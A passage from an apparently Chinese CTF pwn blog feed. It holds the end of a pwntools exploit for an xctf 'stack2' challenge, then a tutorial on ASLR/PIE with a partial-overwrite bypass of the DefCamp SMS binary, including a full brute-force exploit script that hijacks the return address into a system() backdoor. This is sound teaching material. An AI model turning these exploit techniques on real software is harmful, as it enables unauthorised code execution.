string">'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">132</span>                     <span class="token comment" spellcheck="true">#通过计算从132开始覆盖（记得小端序）由于addr的变动覆盖12次</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#pwntools发送的都是str类型</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">+=</span> <span class="token number">1</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这个虽然开了banary但是和他感觉没啥关系</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x46 bytes:    <span class="token string">'1. show numbers\n'</span>    <span class="token string">'2. add number\n'</span>    <span class="token string">'3. change number\n'</span>    <span class="token string">'4. get average\n'</span>    <span class="token string">'5. exit\n'</span>1. show numbers2. add number3. change number4. get average5. <span class="token keyword">exit</span>$ <span class="token function">ls</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x3 bytes:    <span class="token string">'ls\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x24 bytes:    <span class="token string">'bin\n'</span>    <span class="token string">'dev\n'</span>    <span class="token string">'flag\n'</span>    <span class="token string">'lib\n'</span>    <span class="token string">'lib32\n'</span>    <span class="token string">'lib64\n'</span>    <span class="token string">'stack2\n'</span>bindevflagliblib32lib64stack2$ <span class="token function">cat</span> flag<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x9 bytes:    <span class="token string">'cat flag\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x2d bytes:    <span class="token string">'cyberpeace{b39d4c717df76e74117613fc8e3a89d5}\n'</span>cyberpeace<span class="token punctuation">{</span>b39d4c717df76e74117613fc8e3a89d5<span class="token punctuation">}</span>$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PIE绕过</title>
      <link href="/2020/07/14/pie-rao-guo/"/>
      <url>/2020/07/14/pie-rao-guo/</url>
      
        <content type="html"><![CDATA[<h2 id="1：ASLR简单介绍"><a href="#1：ASLR简单介绍" class="headerlink" title="1：ASLR简单介绍"></a>1：ASLR简单介绍</h2><p>ASLR（地址随机化）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。<strong>可以理解为libc、栈、堆的加载位置被随机化。并没有对所有模块和内存区都进行随机化</strong></p><h2 id="2：PIE"><a href="#2：PIE" class="headerlink" title="2：PIE"></a>2：PIE</h2><p>PIE(position-independent executable, 地址无关可执行文件)技术就是一个针对<strong>代码段.text, 数据段.*data，.bss等固定地址</strong>的一个防护技术弥补了ASLR的不足。同ASLR一样，应用了PIE的程序会在每次加载时都变换加载基址，从而使位于程序本身的gadget（代码区）也失效。</p><p>没有PIE保护的程序，每次加载的基址都是固定的</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN$ checksec  h2<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/h2'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>64位基地址：0x400000</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN$ checksec level1<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/level1'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>    RWX:      Has RWX segments</code></pre><p>32位基地址：0x8048000</p><h3 id="开启PIE"><a href="#开启PIE" class="headerlink" title="开启PIE"></a>开启PIE</h3><p>第一次：</p><pre class=" language-bash"><code class="language-bash">   0x562ddaa35a72:    mov    esi,0x80   0x562ddaa35a77:    mov    rdi,rax   0x562ddaa35a7a:    call   0x562ddaa357b0<span class="token operator">=</span><span class="token operator">></span> 0x562ddaa35a7f:    mov    DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>,0x0   0x562ddaa35a86:    jmp    0x562ddaa35aac   0x562ddaa35a88:    mov    eax,DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>   0x562ddaa35a8b:    cdqe      0x562ddaa35a8d:    movzx  ecx,BYTE PTR <span class="token punctuation">[</span>rbp+rax*1-0x90<span class="token punctuation">]</span></code></pre><p>第二次：</p><pre class=" language-bash"><code class="language-bash">   0x5610c0b62a72:    mov    esi,0x80   0x5610c0b62a77:    mov    rdi,rax   0x5610c0b62a7a:    call   0x5610c0b627b0<span class="token operator">=</span><span class="token operator">></span> 0x5610c0b62a7f:    mov    DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>,0x0   0x5610c0b62a86:    jmp    0x5610c0b62aac   0x5610c0b62a88:    mov    eax,DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>   0x5610c0b62a8b:    cdqe      0x5610c0b62a8d:    movzx  ecx,BYTE PTR <span class="token punctuation">[</span>rbp+rax*1-0x90<span class="token punctuation">]</span></code></pre><p>可以看到两次加载的基址是不一样的。<br>显然，PIE的应用给ROP技术造成了很大的影响。但是由于某些系统和缺陷，其他漏洞的存在和地址随机化本身的问题，方法还是有的。</p><h2 id="3：partial-write-bypass-PIE"><a href="#3：partial-write-bypass-PIE" class="headerlink" title="3：partial write bypass PIE"></a>3：partial write bypass PIE</h2><p>partial write(部分写入)就是一种利用了PIE技术缺陷的bypass技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，<strong>某条指令的后12位，3个十六进制数的地址是始终不变的。因此我们找到目标地址的后三个十六进制数，然后想办法将返回地址（被压入的ip）后三个十六进制数覆盖成目标地址，从而达到劫持程序流程的目的</strong></p><h2 id="4：实操"><a href="#4：实操" class="headerlink" title="4：实操"></a>4：实操</h2><p>程序是DefCamp CTF Finals 2016: SMS (pwn 200)</p><h3 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h3><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/PIE$ checksec sms<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/PIE/sms'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><h3 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h3><pre class=" language-c"><code class="language-c">main函数：<span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">puts</span><span class="token punctuation">(</span>    <span class="token string">"--------------------------------------------\n"</span>    <span class="token string">"|   Welcome to Defcamp SMS service          |\n"</span>    <span class="token string">"--------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">dosms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>dosms函数：<span class="token keyword">int</span> <span class="token function">dosms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-C0h]     </span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8Ch] [rbp-34h]</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+B4h] [rbp-Ch]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">40uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    #将v2地址处清零  v3 <span class="token operator">=</span> <span class="token number">140</span><span class="token punctuation">;</span>  <span class="token function">set_user</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">set_sms</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"SMS delivered"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">set_user</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span>函数：<span class="token keyword">int</span> __fastcall <span class="token function">set_user</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">140</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-90h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+9Ch] [rbp-4h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter your name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">140</span><span class="token punctuation">)</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hi, %s"</span><span class="token punctuation">,</span> a1 <span class="token operator">+</span> <span class="token number">140</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">set_sms</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span>函数：<span class="token keyword">char</span> <span class="token operator">*</span>__fastcall <span class="token function">set_sms</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-400h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"SMS our leader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">strncpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>frontdoor函数：<span class="token keyword">int</span> <span class="token function">frontdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-80h]</span>  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>那么可以看出程序大概是：先输出菜单，执行dosms函数。dosms中set_user获取名字，set_sms再次输入。我们要想办法控制程序执行frondoor这个后门。</p><h3 id="3：set-user-int64-amp-v1-函数"><a href="#3：set-user-int64-amp-v1-函数" class="headerlink" title="3：set_user((__int64)&amp;v1)函数"></a>3：set_user((__int64)&amp;v1)函数</h3><pre class=" language-c"><code class="language-c"><span class="token function">set_user</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span>函数：<span class="token keyword">int</span> __fastcall <span class="token function">set_user</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>         #这个函数的参数是dosms函数中<span class="token keyword">char</span> v1的地址，在dosmsm函数中定义了<span class="token keyword">char</span> v1后，通过伪代码可知其位于<span class="token punctuation">[</span>rbp<span class="token operator">-</span>C0h<span class="token punctuation">]</span><span class="token punctuation">{</span>                                           #在这个函数<span class="token operator">&amp;</span>v1参数被写成a1（是个地址）  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">140</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-90h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+9Ch] [rbp-4h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     #数组s，<span class="token number">128</span>字节大小范围清零  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter your name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>             #从标准输入流读取<span class="token number">128</span>个字符到s（地址），<span class="token number">128</span>如果太大就放入空字符  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>     #这个是s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>应该不会是<span class="token number">0</span>（大胆猜测），然后就会循环<span class="token number">41</span>次，将s，<span class="token number">0</span><span class="token operator">~</span><span class="token number">40</span>标号字符赋给a1（v1）地址处，从其<span class="token number">140</span>标号<span class="token operator">~</span><span class="token number">180</span>标号    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">140</span><span class="token punctuation">)</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hi, %s"</span><span class="token punctuation">,</span> a1 <span class="token operator">+</span> <span class="token number">140</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="4：set-sms-int64-amp-v1-函数"><a href="#4：set-sms-int64-amp-v1-函数" class="headerlink" title="4：set_sms((__int64)&amp;v1)函数"></a>4：set_sms((__int64)&amp;v1)函数</h3><p>fastcall是一种函数调用方式，在这里没啥用</p><pre class=" language-c"><code class="language-c"><span class="token function">set_sms</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">)</span>函数：<span class="token keyword">char</span> <span class="token operator">*</span>__fastcall <span class="token function">set_sms</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>               #一样，a1是dosms函数中v1的地址，作为该函数的参数，v1地址位于<span class="token punctuation">[</span>rbp<span class="token operator">-</span>C0h<span class="token punctuation">]</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-400h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      #数组s，<span class="token number">1024</span>字节清零  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"SMS our leader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>                 #从标准输入流读取<span class="token number">1024</span>个字符到s地址  <span class="token keyword">return</span> <span class="token function">strncpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     #strncpy将从s地址处将其字符串赋值到a1（v1）地址，赋值的量得看第三个参数的大小<span class="token punctuation">}</span>                                                                #即a1（v1<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">180</span>地址存放的数值将决定 strncpy函数一次赋值字符串的多少</code></pre><p>那么显然如果strncpy可能存在溢出，只要a1（v1)+180地址处的数值比较大，就可以溢出a1（v1地址），v1其位于[rbp-C0h]。而rbp下面就是返回地址。<br><img src="https://s1.ax1x.com/2020/07/15/Ua624g.png" alt=""><br>*<em>所以得再v1地址开始覆盖：0xc0 + 8(rbp) 个字符 == 200 后面再覆盖返回地址即可控制程序 *</em></p><h3 id="5：综上"><a href="#5：综上" class="headerlink" title="5：综上"></a>5：综上</h3><p>set_user((<strong>int64)&amp;v1)函数可以对a1（v1)+180地址处进行赋值，使其赋为0xca （202）。这样set_sms((</strong>int64)&amp;v1)函数就可以往a1（v1）地址读入0xca（202） 个字符。这样就可以来控制程序返回地址了。<br>为什么是202个字符，结合上面的PIE地址特点。最后面两个字节（16位）会占用后4个十六进制数（小端序）而不变的是后三个十六进制数，所以我们构造的倒数第四个十六进制数需要多次执行程序碰到刚好符合的地址。不可能放201个字符因为最后一个字节只能控制两个十六进制数。</p><p>因为那个倒数第四个数需要多次执行才可能碰到所以我们要进行循环爆破，但也就0~f这几种情况，爆破次数应该不会很大，可以接受。</p><p>后门的特征地址：</p><pre class=" language-bash"><code class="language-bash">.text:0000000000000900 push    rbp.text:0000000000000901 mov     rbp, rsp.text:0000000000000904 add     rsp, 0FFFFFFFFFFFFFF80h <span class="token punctuation">;</span> Add.text:0000000000000908 mov     rdx, cs:__bss_start <span class="token punctuation">;</span> stream.text:000000000000090F lea     rax, <span class="token punctuation">[</span>rbp+s<span class="token punctuation">]</span>    <span class="token punctuation">;</span> Load Effective Address.text:0000000000000913 mov     esi, 80h        <span class="token punctuation">;</span> n.text:0000000000000918 mov     rdi, rax        <span class="token punctuation">;</span> s.text:000000000000091B call    _fgets          <span class="token punctuation">;</span> Call Procedure.text:0000000000000920 lea     rax, <span class="token punctuation">[</span>rbp+s<span class="token punctuation">]</span>    <span class="token punctuation">;</span> Load Effective Address.text:0000000000000924 mov     rdi, rax        <span class="token punctuation">;</span> <span class="token function">command</span>.text:0000000000000927 call    _system         <span class="token punctuation">;</span> Call Procedure.text:000000000000092C nop                     <span class="token punctuation">;</span> No Operation.text:000000000000092D leave                   <span class="token punctuation">;</span> High Level Procedure Exit.text:000000000000092E retn                    <span class="token punctuation">;</span> Return Near from Pro</code></pre><p><strong>所以200个padding后面 应该如此构造：’\x00’ + ‘\x99’  (小端序倒着存）后面这个x99第一个9就是猜的，随便一个都行。</strong><br>所以主要exp因该是：</p><pre class=" language-python"><code class="language-python">    payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span> <span class="token operator">+</span><span class="token string">'\xca'</span>     sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span> payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">200</span>  <span class="token operator">+</span> <span class="token string">'\x00\x99'</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span></code></pre><p>但是很可惜这是错的！！！为啥？因为你在payload2上放了一个\x00这难道不会被strncpy当作截断符吗？？？<br>所以往后面调一下：\x01\x99</p><h3 id="6：EXP"><a href="#6：EXP" class="headerlink" title="6：EXP"></a>6：EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep    <span class="token comment" spellcheck="true">#引入time模块的sleep函数可以让爆破过程放慢，我们看到清楚一点</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true">#256，也可以小一点</span>        i <span class="token operator">+=</span> <span class="token number">1</span>                     <span class="token keyword">print</span> i             <span class="token comment" spellcheck="true">#可以显示爆破次数</span>        sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./sms'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>    <span class="token comment" spellcheck="true">#set_user</span>    payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">40</span> <span class="token operator">+</span><span class="token string">'\xca'</span>    <span class="token comment" spellcheck="true">#set_user((__int64)&amp;v1)函数循环赋值41次最后的'\xca'就是为覆盖返回地址准备的</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#set_sms</span>    payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">200</span>  <span class="token operator">+</span> <span class="token string">'\x01\x99'</span>     <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">#sh.sendline("/bin/sh\x00")</span>        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'cat sms.py\x00'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#这里我直接cat 本地文件了，也可以用/bin/sh，我跟倾向于cat 文件 比较明了。</span>        sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment" spellcheck="true">#print sh.recv() 这个操作可以多学习</span>        <span class="token comment" spellcheck="true">#sh.interactive()</span>        <span class="token keyword">break</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span></code></pre><p><img src="https://s1.ax1x.com/2020/07/15/Ua6WCQ.png" alt=""><br>成功！！！</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wiki-canary绕过</title>
      <link href="/2020/07/12/wiki-canary-rao-guo/"/>
      <url>/2020/07/12/wiki-canary-rao-guo/</url>
      
